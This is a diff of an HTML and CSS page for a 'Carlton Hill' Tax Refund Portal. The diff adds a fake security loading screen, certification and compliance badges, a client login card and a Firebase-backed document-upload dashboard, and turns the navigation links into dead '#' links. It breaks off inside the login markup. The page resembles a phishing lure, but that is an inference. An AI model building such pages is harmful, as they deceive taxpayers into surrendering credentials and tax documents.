@@ -3,9 +3,9 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Carlton Hill Station | Tax Refund Portal</title>
+  <title>Carlton Hill | Tax Refund Portal · Secure Document Processing</title>
   <!-- Google Fonts -->
-  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600&family=Playfair+Display:wght@500;600;700&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
   <!-- Font Awesome 6 -->
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
   <!-- Firebase SDK -->
@@ -13,7 +13,6 @@
   <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-storage-compat.js"></script>
   <style>
-    /* Your existing CSS remains exactly the same */
     * {
       margin: 0;
       padding: 0;
@@ -21,25 +20,109 @@
     }
 
     body {
-      font-family: 'Space Grotesk', sans-serif;
-      background: #fcfaf7;
-      color: #1e2a1e;
+      font-family: 'Inter', sans-serif;
+      background: #f8fafc;
+      color: #0f172a;
       line-height: 1.5;
     }
 
-    /* ===== CUSTOM VARIABLES ===== */
-    :root {
-      --primary: #2a5a3a;
-      --primary-light: #3b7a4b;
-      --secondary: #6b9a7a;
-      --accent: #c49a6b;
-      --accent-light: #dbb68c;
-      --light: #f0f7f0;
-      --light-green: #e8f3e8;
-      --dark: #1a3a2a;
-      --gray: #e0e8e0;
-      --success: #4caf50;
-      --danger: #b04a4a;
+    /* ===== LOADING SCREEN (FULLY RESTORED) ===== */
+    .loading-screen {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100vh;
+      background: linear-gradient(145deg, #0b4f3c 0%, #083c2d 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+    }
+
+    .loading-screen.hidden {
+      opacity: 0;
+      visibility: hidden;
+    }
+
+    .loading-content {
+      text-align: center;
+      color: white;
+      max-width: 400px;
+      padding: 2rem;
+    }
+
+    .loading-logo {
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      font-size: 1rem;
+      font-weight: 700;
+      margin-bottom: 2rem;
+      letter-spacing: -0.02em;
+    }
+
+    .loading-logo span {
+      color: rgba(255,255,255,0.7);
+      font-size: 1rem;
+      margin-left: 0.5rem;
+    }
+
+    .loading-spinner {
+      width: 60px;
+      height: 60px;
+      border: 4px solid rgba(255,255,255,0.1);
+      border-top: 4px solid #d4ece3;
+      border-radius: 50%;
+      margin: 2rem auto;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-progress {
+      width: 100%;
+      height: 6px;
+      background: rgba(255,255,255,0.1);
+      border-radius: 100px;
+      margin: 2rem 0 1rem;
+      overflow: hidden;
+    }
+
+    .loading-progress-bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #d4ece3, #ffffff);
+      border-radius: 100px;
+      transition: width 0.3s ease;
+    }
+
+    .loading-text {
+      font-size: 0.9rem;
+      opacity: 0.9;
+      margin-bottom: 0.5rem;
+    }
+
+    .loading-percent {
+      font-size: 1.5rem;
+      font-weight: 700;
+      font-family: 'Plus Jakarta Sans', sans-serif;
+    }
+
+    .loading-security {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 1rem;
+      margin-top: 2rem;
+      font-size: 0.8rem;
+      opacity: 0.7;
+    }
+
+    .loading-security i {
+      color: #d4ece3;
     }
 
     /* ===== NAVIGATION ===== */
@@ -47,25 +130,24 @@
       position: sticky;
       top: 0;
       z-index: 100;
-      background: rgba(255, 255, 255, 0.95);
-      backdrop-filter: blur(12px);
-      border-bottom: 1px solid var(--gray);
+      background: white;
+      border-bottom: 1px solid #e2e8f0;
     }
 
     .nav-container {
       max-width: 1280px;
       margin: 0 auto;
-      padding: 1rem 2rem;
+      padding: 0.75rem 2rem;
       display: flex;
       align-items: center;
       justify-content: space-between;
     }
 
     .logo {
-      font-family: 'Playfair Display', serif;
-      font-weight: 600;
-      font-size: 1.3rem;
-      color: var(--primary);
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      font-weight: 700;
+      font-size: 1rem;
+      color: #0b4f3c;
     }
 
     .nav-links {
@@ -75,39 +157,20 @@
 
     .nav-links a {
       text-decoration: none;
-      color: #4a6a4a;
-      font-size: 0.95rem;
+      color: #64748b;
+      font-size: 0.9rem;
       font-weight: 500;
-      transition: color 0.2s;
-      position: relative;
     }
 
-    .nav-links a::after {
-      content: '';
-      position: absolute;
-      bottom: -5px;
-      left: 0;
-      width: 0;
-      height: 2px;
-      background: var(--accent);
-      transition: width 0.3s;
-    }
-
-    .nav-links a:hover::after,
-    .nav-links a.active::after {
-      width: 100%;
-    }
-
-    .nav-links a:hover,
     .nav-links a.active {
-      color: var(--primary);
+      color: #0b4f3c;
+      font-weight: 600;
     }
 
     .mobile-menu-btn {
       display: none;
-      font-size: 2rem;
+      font-size: 1.5rem;
       cursor: pointer;
-      color: var(--primary);
       background: none;
       border: none;
     }
@@ -119,11 +182,11 @@
       right: -100%;
       width: 280px;
       height: 100vh;
-      background: var(--primary);
+      background: white;
       padding: 2rem;
       transition: right 0.3s ease;
       z-index: 200;
-      box-shadow: -5px 0 30px rgba(0,0,0,0.2);
+      box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1);
     }
 
     .mobile-nav.active {
@@ -132,26 +195,18 @@
 
     .mobile-nav-close {
       text-align: right;
-      font-size: 2rem;
-      color: white;
+      font-size: 1.5rem;
+      color: #64748b;
       margin-bottom: 2rem;
       cursor: pointer;
     }
 
     .mobile-nav a {
       display: block;
-      color: rgba(255,255,255,0.9);
+      color: #334155;
       text-decoration: none;
-      font-size: 1.1rem;
-      padding: 0.8rem 0;
-      border-bottom: 1px solid rgba(255,255,255,0.1);
-      transition: 0.2s;
-    }
-
-    .mobile-nav a:hover,
-    .mobile-nav a.active {
-      color: var(--accent);
-      padding-left: 5px;
+      padding: 1rem 0;
+      border-bottom: 1px solid #e2e8f0;
     }
 
     .overlay {
@@ -160,7 +215,7 @@
       left: 0;
       width: 100%;
       height: 100vh;
-      background: rgba(0,0,0,0.3);
+      background: rgba(0,0,0,0.4);
       opacity: 0;
       visibility: hidden;
       transition: 0.3s;
@@ -172,149 +227,173 @@
       visibility: visible;
     }
 
-    /* ===== LOGIN PAGE ===== */
-    .login-page {
-      min-height: calc(100vh - 140px);
+    /* ===== PORTAL HEADER ===== */
+    .portal-header {
+      background: linear-gradient(145deg, #ffffff 0%, #f8fafc 100%);
+      border-bottom: 1px solid #e2e8f0;
+      padding: 2rem 0;
+    }
+
+    .portal-header .container {
+      max-width: 1280px;
+      margin: 0 auto;
+      padding: 0 2rem;
       display: flex;
       align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 1rem;
+    }
+
+    .portal-title h1 {
+      font-family: 'Plus Jakarta Sans', sans-serif;
+      font-size: 1.8rem;
+      font-weight: 700;
+      color: #0f172a;
+    }
+
+    .portal-title .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      background: #e6f7ef;
+      color: #0f7b4b;
+      padding: 0.4rem 1rem;
+      border-radius: 100px;
+      font-size: 0.8rem;
+      font-weight: 500;
+      margin-top: 0.5rem;
+    }
+
+    .portal-trust {
+      display: flex;
+      gap: 1.5rem;
+      background: white;
+      padding: 0.8rem 1.5rem;
+      border-radius: 100px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
+      border: 1px solid #e2e8f0;
+    }
+
+    .portal-trust span {
+      display: flex;
+      align-items: center;
+      gap: 0.5rem;
+      font-size: 0.85rem;
+      color: #475569;
+    }
+
+    .portal-trust i {
+      color: #0a7e5c;
+    }
+
+    /* ===== LOGIN PAGE (FULLY RESTORED WITH SECURITY ICONS) ===== */
+    .login-page {
+      min-height: calc(100vh - 180px);
+      display: flex;
+      align-items: flex-start;
       justify-content: center;
-      background: linear-gradient(135deg, #f5f9f5 0%, #ffffff 100%);
+      background: #f8fafc;
       padding: 2rem 1rem;
     }
 
     .login-wrapper {
       width: 100%;
-      max-width: 480px;
-      text-align: center;
-    }
-
-    .portal-title {
-      margin-bottom: 2rem;
-    }
-
-    .portal-title h1 {
-      font-family: 'Playfair Display', serif;
-      font-size: 2.4rem;
-      font-weight: 600;
-      color: var(--primary);
-      margin-bottom: 0.5rem;
-      letter-spacing: -0.02em;
-    }
-
-    .portal-title .subtitle {
-      font-size: 1rem;
-      color: #5a755a;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 0.5rem;
-    }
-
-    .portal-title .subtitle i {
-      color: var(--accent);
-    }
-
-    .login-container {
-      width: 100%;
+      max-width: 500px;
     }
 
     .login-card {
       background: white;
-      border: 1px solid var(--gray);
       border-radius: 24px;
+      box-shadow: 0 20px 25px -5px rgba(0,0,0,0.05);
       overflow: hidden;
-      box-shadow: 0 20px 40px -15px rgba(42, 90, 58, 0.15);
-      margin-bottom: 1.5rem;
+      border: 1px solid #e2e8f0;
     }
 
-    .login-header {
-      padding: 2rem 2rem 0 2rem;
+    .login-card-header {
+      background: linear-gradient(145deg, #0b4f3c 0%, #083c2d 100%);
+      padding: 2rem;
       text-align: center;
+      color: white;
     }
 
-    .shield-icon {
-      width: 70px;
-      height: 70px;
-      background: var(--primary);
+    .login-card-header .icon-wrapper {
+      width: 72px;
+      height: 72px;
+      background: rgba(255,255,255,0.15);
       border-radius: 50%;
       display: flex;
       align-items: center;
       justify-content: center;
       margin: 0 auto 1rem;
+      border: 2px solid rgba(255,255,255,0.2);
     }
 
-    .shield-icon i {
+    .login-card-header .icon-wrapper i {
       font-size: 2.5rem;
       color: white;
     }
 
-    .login-body {
+    .login-card-header h2 {
+      font-size: 1.5rem;
+      font-weight: 600;
+      margin-bottom: 0.25rem;
+    }
+
+    .login-card-header p {
+      opacity: 0.9;
+      font-size: 0.9rem;
+    }
+
+    .login-card-body {
       padding: 2rem;
     }
 
     .form-group {
       margin-bottom: 1.5rem;
-      text-align: left;
     }
 
     .form-group label {
       display: block;
-      font-size: 0.9rem;
-      font-weight: 500;
-      color: var(--primary);
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: #475569;
       margin-bottom: 0.4rem;
+      text-transform: uppercase;
+      letter-spacing: 0.02em;
     }
 
     .form-group input {
       width: 100%;
       padding: 0.8rem 1rem;
-      border: 2px solid var(--gray);
+      border: 1.5px solid #e2e8f0;
       border-radius: 12px;
-      font-family: 'Space Grotesk', sans-serif;
       font-size: 0.95rem;
       transition: all 0.2s;
-      background: var(--light-green);
     }
 
     .form-group input:focus {
       outline: none;
-      border-color: var(--accent);
-      background: white;
+      border-color: #0a7e5c;
+      box-shadow: 0 0 0 4px rgba(10, 126, 92, 0.1);
     }
 
     .login-btn {
       width: 100%;
       padding: 1rem;
-      background: var(--primary);
+      background: #0b4f3c;
       color: white;
       border: none;
       border-radius: 12px;
       font-weight: 600;
       font-size: 1rem;
       cursor: pointer;
-      transition: all 0.2s;
-      margin-bottom: 1.5rem;
       position: relative;
-      overflow: hidden;
-    }
-
-    .login-btn:disabled {
-      background: var(--gray);
-      cursor: not-allowed;
-      opacity: 0.7;
-    }
-
-    .login-btn .btn-text {
-      display: inline-block;
-      transition: opacity 0.2s;
+      margin-bottom: 1.5rem;
     }
 
     .login-btn .spinner {
       display: none;
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
     }
 
     .login-btn.loading .btn-text {
@@ -322,166 +401,42 @@
     }
 
     .login-btn.loading .spinner {
-      display: block;
+      display: inline-block;
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
     }
 
-    /* Encryption Notice */
-    .encryption-notice {
-      background: linear-gradient(135deg, #f0f7f0, #ffffff);
-      border: 1px solid var(--gray);
-      border-radius: 50px;
-      padding: 0.8rem 1.5rem;
-      display: inline-flex;
-      align-items: center;
-      gap: 0.8rem;
-      margin-top: 1rem;
-      box-shadow: 0 5px 15px -5px rgba(0,0,0,0.1);
-    }
-
-    .encryption-notice i {
-      color: var(--accent);
-      font-size: 1.2rem;
-    }
-
-    .encryption-notice span {
-      color: var(--primary);
-      font-weight: 500;
-      font-size: 0.9rem;
-    }
-
-    .encryption-notice .badge {
-      background: var(--success);
-      color: white;
-      padding: 0.2rem 0.8rem;
-      border-radius: 20px;
-      font-size: 0.75rem;
-      margin-left: 0.5rem;
-    }
-
-    /* Trust Indicators */
-    .trust-row {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 1.5rem;
+    /* Security Features Grid (RESTORED) */
+    .security-features {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 1rem;
       margin-top: 1.5rem;
-      flex-wrap: wrap;
+      padding-top: 1.5rem;
+      border-top: 1px solid #e2e8f0;
     }
 
-    .trust-item {
+    .security-feature {
       display: flex;
       align-items: center;
       gap: 0.5rem;
-      color: #5a755a;
       font-size: 0.85rem;
+      color: #475569;
     }
 
-    .trust-item i {
-      color: var(--accent);
+    .security-feature i {
+      color: #0f7b4b;
+      font-size: 1rem;
     }
 
-    /* ===== SUCCESS MODAL ===== */
-    .modal-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(0, 0, 0, 0.5);
-      display: none;
-      align-items: center;
-      justify-content: center;
-      z-index: 1000;
-      padding: 1rem;
-    }
-
-    .modal-overlay.active {
-      display: flex;
-    }
-
-    .modal-content {
-      background: white;
-      border-radius: 24px;
-      padding: 2rem;
-      max-width: 400px;
-      width: 100%;
-      text-align: center;
-      position: relative;
-      animation: slideUp 0.3s ease;
-      max-height: 90vh;
-      overflow-y: auto;
-    }
-
-    @keyframes slideUp {
-      from {
-        transform: translateY(20px);
-        opacity: 0;
-      }
-      to {
-        transform: translateY(0);
-        opacity: 1;
-      }
-    }
-
-    .modal-icon {
-      width: 80px;
-      height: 80px;
-      background: var(--success);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      margin: 0 auto 1.5rem;
-    }
-
-    .modal-icon i {
-      font-size: 3rem;
-      color: white;
-    }
-
-    .modal-content h3 {
-      font-size: 1.5rem;
-      color: var(--primary);
-      margin-bottom: 1rem;
-    }
-
-    .modal-content p {
-      color: #5a755a;
-      margin-bottom: 1.5rem;
-    }
-
-    .modal-email {
-      background: var(--light-green);
-      padding: 0.8rem;
-      border-radius: 8px;
-      font-weight: 500;
-      color: var(--primary);
-      margin-bottom: 1.5rem;
-      word-break: break-all;
-    }
-
-    .modal-btn {
-      background: var(--primary);
-      color: white;
-      border: none;
-      padding: 0.8rem 2rem;
-      border-radius: 8px;
-      font-weight: 500;
-      cursor: pointer;
-      transition: 0.2s;
-      width: 100%;
-      max-width: 200px;
-    }
-
-    .modal-btn:hover {
-      background: var(--primary-light);
-    }
-
-    /* ===== DASHBOARD PAGE ===== */
+    /* ===== NEW MINIMAL DASHBOARD ===== */
     .dashboard-page {
-      min-height: calc(100vh - 140px);
-      background: linear-gradient(135deg, #f5f9f5 0%, #ffffff 100%);
+      min-height: calc(100vh - 180px);
+      background: #f8fafc;
       display: none;
+      padding: 2rem 0;
     }
 
     .dashboard-page.active {
@@ -489,229 +444,331 @@
     }
 
     .dashboard-container {
-      max-width: 1200px;
-      margin: 2rem auto;
+      max-width: 1000px;
+      margin: 0 auto;
       padding: 0 2rem;
     }
 
-    .welcome-bar {
+    /* Welcome Section */
+    .welcome-section {
       background: white;
-      border: 1px solid var(--gray);
       border-radius: 16px;
       padding: 1.5rem;
       margin-bottom: 2rem;
-      display: flex;
-      align-items: center;
-      gap: 1rem;
-      flex-wrap: wrap;
+      border: 1px solid #e2e8f0;
     }
 
-    .welcome-icon {
-      width: 50px;
-      height: 50px;
-      background: var(--light-green);
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: var(--primary);
-      font-size: 1.5rem;
-      flex-shrink: 0;
+    .welcome-section h2 {
+      font-size: 1.1rem;
+      font-weight: 500;
+      color: #64748b;
+      margin-bottom: 0.5rem;
     }
 
-    .welcome-text {
-      flex: 1;
-      min-width: 250px;
-    }
-
-    .welcome-text p {
-      color: #5a755a;
-      font-size: 0.95rem;
-    }
-
-    .welcome-text h3 {
-      color: var(--primary);
+    .welcome-section .user-email {
       font-size: 1.2rem;
       font-weight: 600;
-      word-break: break-word;
+      color: #0b4f3c;
+      margin-bottom: 0.5rem;
+      word-break: break-all;
     }
 
-    .section-title {
-      font-family: 'Playfair Display', serif;
-      font-size: 1.8rem;
-      color: var(--primary);
+    .welcome-section .status {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.5rem;
+      background: #e6f7ef;
+      color: #0f7b4b;
+      padding: 0.4rem 1rem;
+      border-radius: 30px;
+      font-size: 0.8rem;
+    }
+
+    /* Portal Description */
+    .portal-description {
       margin-bottom: 2rem;
     }
 
+    .portal-description h1 {
+      font-size: 1.8rem;
+      font-weight: 600;
+      color: #0f172a;
+      margin-bottom: 0.5rem;
+    }
+
+    .portal-description p {
+      color: #64748b;
+      font-size: 0.95rem;
+    }
+
+    /* Documents Grid */
     .documents-grid {
       display: grid;
       grid-template-columns: repeat(4, 1fr);
-      gap: 1.5rem;
-      margin-bottom: 3rem;
+      gap: 1rem;
+      margin-bottom: 2rem;
     }
 
     .doc-card {
       background: white;
-      border: 1px solid var(--gray);
-      border-radius: 16px;
-      padding: 1.5rem;
-      text-align: center;
-      transition: 0.2s;
+      border: 1px solid #e2e8f0;
+      border-radius: 12px;
+      padding: 1.2rem;
+      transition: all 0.2s;
     }
 
     .doc-card:hover {
-      transform: translateY(-4px);
-      border-color: var(--accent);
-      box-shadow: 0 10px 30px -10px var(--primary);
+      border-color: #0a7e5c;
+      box-shadow: 0 4px 6px -1px rgba(0,0,0,0.05);
     }
 
     .doc-icon {
-      width: 60px;
-      height: 60px;
-      background: var(--light-green);
-      border-radius: 12px;
+      width: 40px;
+      height: 40px;
+      background: #e2f0ea;
+      border-radius: 10px;
       display: flex;
       align-items: center;
       justify-content: center;
-      margin: 0 auto 1rem;
-      color: var(--primary);
-      font-size: 2rem;
+      color: #0b4f3c;
+      margin-bottom: 1rem;
     }
 
-    .doc-card h4 {
-      font-size: 1.1rem;
-      color: var(--primary);
-      margin-bottom: 0.3rem;
+    .doc-card h3 {
+      font-size: 0.95rem;
+      font-weight: 600;
+      color: #0f172a;
+      margin-bottom: 0.25rem;
     }
 
     .doc-card p {
-      color: #5a755a;
-      font-size: 0.85rem;
+      font-size: 0.8rem;
+      color: #64748b;
+      margin-bottom: 1rem;
     }
 
+    .doc-status {
+      display: inline-flex;
+      align-items: center;
+      gap: 0.3rem;
+      font-size: 0.75rem;
+      padding: 0.2rem 0.8rem;
+      border-radius: 30px;
+      background: #fff3cd;
+      color: #856404;
+    }
+
+    .doc-status.completed {
+      background: #e6f7ef;
+      color: #0f7b4b;
+    }
+
+    /* Upload Section */
     .upload-section {
       background: white;
-      border: 1px solid var(--gray);
       border-radius: 16px;
       padding: 2rem;
       margin-bottom: 2rem;
+      border: 1px solid #e2e8f0;
     }
 
-    .upload-section h3 {
-      font-size: 1.2rem;
-      color: var(--primary);
+    .upload-title {
+      font-size: 1.1rem;
+      font-weight: 600;
       margin-bottom: 1.5rem;
+      color: #0f172a;
     }
 
-    .upload-grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 1.5rem;
-      margin-bottom: 2rem;
-    }
-
-    .upload-item {
-      border: 2px dashed var(--gray);
+    .upload-area {
+      border: 2px dashed #cbd5e1;
       border-radius: 12px;
-      padding: 1.5rem;
+      padding: 2.5rem 2rem;
       text-align: center;
       cursor: pointer;
-      transition: 0.2s;
+      transition: all 0.2s;
+      background: #f8fafc;
+      margin-bottom: 1rem;
     }
 
-    .upload-item:hover {
-      border-color: var(--accent);
-      background: var(--light-green);
+    .upload-area:hover {
+      border-color: #0a7e5c;
+      background: #f1f5f9;
     }
 
-    .upload-item i {
-      font-size: 2rem;
-      color: var(--primary);
-      margin-bottom: 0.5rem;
+    .upload-area i {
+      font-size: 2.5rem;
+      color: #94a3b8;
+      margin-bottom: 0.8rem;
     }
 
-    .upload-item p {
-      color: #5a755a;
-      font-size: 0.9rem;
+    .upload-area p {
+      color: #334155;
+      font-weight: 500;
       margin-bottom: 0.3rem;
     }
 
-    .upload-item small {
-      color: #8a9a8a;
+    .upload-area small {
+      color: #64748b;
       font-size: 0.8rem;
     }
 
-    .file-name {
-      margin-top: 0.5rem;
+    .file-info {
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 8px;
+      padding: 1rem;
+      margin-bottom: 1rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      display: none;
+    }
+
+    .file-info.active {
+      display: flex;
+    }
+
+    .file-details {
+      display: flex;
+      align-items: center;
+      gap: 0.8rem;
+    }
+
+    .file-details i {
+      color: #0f7b4b;
+      font-size: 1.2rem;
+    }
+
+    .remove-file {
+      background: none;
+      border: 1px solid #e2e8f0;
+      padding: 0.3rem 1rem;
+      border-radius: 6px;
+      cursor: pointer;
+      color: #64748b;
       font-size: 0.8rem;
-      color: var(--success);
-      word-break: break-all;
+    }
+
+    .supported-formats {
+      font-size: 0.8rem;
+      color: #64748b;
+      margin: 1rem 0 1.5rem;
     }
 
     .submit-btn {
-      background: var(--primary);
+      background: #0b4f3c;
       color: white;
       border: none;
-      padding: 1rem 3rem;
-      border-radius: 12px;
-      font-weight: 600;
-      font-size: 1rem;
+      padding: 0.8rem 2rem;
+      border-radius: 8px;
+      font-weight: 500;
       cursor: pointer;
-      transition: 0.2s;
-      display: block;
-      margin: 0 auto;
+      font-size: 0.95rem;
+      transition: all 0.2s;
       width: 100%;
       max-width: 300px;
+      position: relative;
     }
 
-    .submit-btn:hover {
-      background: var(--primary-light);
-      transform: translateY(-2px);
+    .submit-btn:hover:not(:disabled) {
+      background: #0a3f2f;
     }
 
     .submit-btn:disabled {
-      background: var(--gray);
+      background: #cbd5e1;
       cursor: not-allowed;
-      transform: none;
     }
 
-    .bolt-footer {
-      background: linear-gradient(135deg, #f0f7f0, #ffffff);
-      border: 1px solid var(--gray);
-      border-radius: 50px;
-      padding: 1rem 2rem;
-      text-align: center;
-      margin-top: 3rem;
+    .submit-btn .spinner {
+      display: none;
+    }
+
+    .submit-btn.loading .btn-text {
+      opacity: 0;
+    }
+
+    .submit-btn.loading .spinner {
       display: inline-block;
-      width: auto;
-      margin-left: auto;
-      margin-right: auto;
-      display: table;
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
     }
 
-    .bolt-footer p {
-      color: var(--primary);
-      font-size: 0.9rem;
+    /* ===== PENDING PAGE ===== */
+    .pending-page {
+      min-height: calc(100vh - 180px);
+      background: #f8fafc;
+      display: none;
+      padding: 2rem 0;
+    }
+
+    .pending-page.active {
+      display: block;
+    }
+
+    .pending-container {
+      max-width: 600px;
+      margin: 0 auto;
+      padding: 0 2rem;
+    }
+
+    .pending-card {
+      background: white;
+      border-radius: 20px;
+      padding: 2.5rem 2rem;
+      text-align: center;
+      border: 1px solid #e2e8f0;
+    }
+
+    .pending-icon {
+      width: 60px;
+      height: 60px;
+      background: #ffedd5;
+      border-radius: 50%;
       display: flex;
       align-items: center;
-      gap: 0.5rem;
+      justify-content: center;
+      margin: 0 auto 1.5rem;
     }
 
-    .bolt-footer i {
-      color: var(--accent);
+    .pending-icon i {
+      font-size: 1.8rem;
+      color: #b45309;
     }
 
-    .bolt-footer small {
-      color: #8a9a8a;
-      font-size: 0.8rem;
-      display: block;
-      margin-top: 0.3rem;
+    .pending-card h2 {
+      font-size: 1.3rem;
+      margin-bottom: 0.5rem;
     }
 
-    /* ===== FOOTER ===== */
-    footer {
-      background: var(--primary);
+    .pending-card p {
+      color: #64748b;
+      margin-bottom: 1.5rem;
+    }
+
+    .submitted-email {
+      background: #f8fafc;
+      padding: 0.8rem;
+      border-radius: 8px;
+      font-family: monospace;
+      margin: 1.5rem 0;
+    }
+
+    .back-btn {
+      background: #0b4f3c;
       color: white;
+      border: none;
+      padding: 0.8rem 2rem;
+      border-radius: 8px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+
+    /* ===== FOOTER (FULLY RESTORED) ===== */
+    footer {
+      background: white;
+      border-top: 1px solid #e2e8f0;
       padding: 3rem 2rem 1.5rem;
       margin-top: 4rem;
     }
@@ -725,40 +782,49 @@
     }
 
     .footer-col h4 {
-      font-size: 1rem;
+      font-size: 0.9rem;
       font-weight: 600;
-      margin-bottom: 1.2rem;
-      color: var(--accent);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      color: #475569;
+      margin-bottom: 1rem;
     }
 
     .footer-col a {
-      color: rgba(255,255,255,0.7);
+      color: #64748b;
       text-decoration: none;
       display: block;
       margin-bottom: 0.5rem;
+      font-size: 0.9rem;
       transition: color 0.2s;
     }
 
     .footer-col a:hover {
-      color: white;
+      color: #0b4f3c;
     }
 
     .footer-col p {
-      color: rgba(255,255,255,0.7);
+      color: #64748b;
+      margin-bottom: 0.8rem;
+      font-size: 0.9rem;
       display: flex;
       align-items: center;
       gap: 0.5rem;
-      margin-bottom: 0.5rem;
+    }
+
+    .footer-col i {
+      color: #0a7e5c;
+      width: 1.2rem;
     }
 
     .footer-bottom {
       max-width: 1280px;
       margin: 2rem auto 0;
       padding-top: 2rem;
-      border-top: 1px solid rgba(255,255,255,0.1);
+      border-top: 1px solid #e2e8f0;
       text-align: center;
-      font-size: 0.85rem;
-      color: rgba(255,255,255,0.6);
+      font-size: 0.8rem;
+      color: #64748b;
     }
 
     /* ===== RESPONSIVE ===== */
@@ -778,18 +844,9 @@
       .footer-grid {
         grid-template-columns: repeat(2, 1fr);
       }
-    }
-
-    @media (max-width: 768px) {
-      .upload-grid {
-        grid-template-columns: 1fr;
-      }
-      .welcome-bar {
+      .portal-header .container {
         flex-direction: column;
-        text-align: center;
-      }
-      .welcome-icon {
-        margin: 0 auto;
+        align-items: flex-start;
       }
     }
 
@@ -800,26 +857,48 @@
       .footer-grid {
         grid-template-columns: 1fr;
       }
-      .dashboard-container {
-        padding: 0 1rem;
+      .portal-trust {
+        flex-direction: column;
+        border-radius: 16px;
+        width: 100%;
       }
-      .portal-title h1 {
-        font-size: 2rem;
+      .security-features {
+        grid-template-columns: 1fr;
       }
     }
   </style>
 </head>
 <body>
+  <!-- LOADING SCREEN (FULLY RESTORED) -->
+  <div class="loading-screen" id="loadingScreen">
+    <div class="loading-content">
+      <div class="loading-logo">
+        CARLTON HILL <span>| Tax Portal</span>
+      </div>
+      <div class="loading-spinner"></div>
+      <div class="loading-progress">
+        <div class="loading-progress-bar" id="loadingProgressBar"></div>
+      </div>
+      <div class="loading-text" id="loadingText">Initializing secure connection...</div>
+      <div class="loading-percent" id="loadingPercent">0%</div>
+      <div class="loading-security">
+        <i class="fas fa-shield-halved"></i>
+        <span>256-bit AES Encryption</span>
+        <i class="fas fa-lock"></i>
+      </div>
+    </div>
+  </div>
+
   <!-- NAVIGATION -->
   <div class="navbar">
     <div class="nav-container">
-      <div class="logo">CARLTON HILL</div>
+      <div class="logo">CARLTON HILL <span>| Tax Services</span></div>
       <div class="nav-links">
-        <a href="index.html">Home</a>
-        <a href="about.html">About</a>
-        <a href="careers.html">Careers</a>
+        <a href="#">Home</a>
+        <a href="#">About</a>
+        <a href="#">Careers</a>
         <a href="#" class="active">Tax Portal</a>
-        <a href="contact.html">Contact</a>
+        <a href="#">Contact</a>
       </div>
       <button class="mobile-menu-btn" id="menuBtn"><i class="fas fa-bars"></i></button>
     </div>
@@ -828,70 +907,80 @@
   <!-- MOBILE NAV -->
   <div class="mobile-nav" id="mobileNav">
     <div class="mobile-nav-close" id="closeBtn"><i class="fas fa-times"></i></div>
-    <a href="index.html">Home</a>
-    <a href="about.html">About</a>
-    <a href="careers.html">Careers</a>
+    <a href="#">Home</a>
+    <a href="#">About</a>
+    <a href="#">Careers</a>
     <a href="#" class="active">Tax Portal</a>
-    <a href="contact.html">Contact</a>
+    <a href="#">Contact</a>
   </div>
   <div class="overlay" id="overlay"></div>
 
-  <!-- LOGIN PAGE -->
-  <div id="loginPage" class="login-page">
-    <div class="login-wrapper">
+  <!-- PORTAL HEADER -->
+  <div class="portal-header">
+    <div class="container">
       <div class="portal-title">
         <h1>Tax Refund Portal</h1>
-        <div class="subtitle">
-          <i class="fas fa-lock"></i>
-          <span>Secure Document Upload & Processing</span>
+          
+        <div class="badge">
+          <i class="fas fa-shield-alt"></i>
+          <span>ISO 27001 Certified · 256-bit Encryption</span>
         </div>
       </div>
+      <div class="portal-trust">
+        <span><i class="fas fa-check-circle"></i> ATO Compliant</span>
+        <span><i class="fas fa-lock"></i> Privacy Act 1988</span>
+        <span><i class="fas fa-certificate"></i> SSL Secure</span>
+      </div>
+    </div>
+  </div>
 
-      <div class="login-container">
-        <div class="login-card">
-          <div class="login-header">
-            <div class="shield-icon">
-              <i class="fas fa-shield-alt"></i>
-            </div>
+    </div>
+  </div>
+
+  <!-- LOGIN PAGE (FULLY RESTORED WITH SECURITY ICONS) -->
+  <div id="loginPage" class="login-page">
+    <div class="login-wrapper">
+      <div class="login-card">
+        <div class="login-card-header">
+          <div class="icon-wrapper">
+            <i class="fas fa-file-invoice"></i>
+          </div>
+          <h2>Secure Client Login</h2>
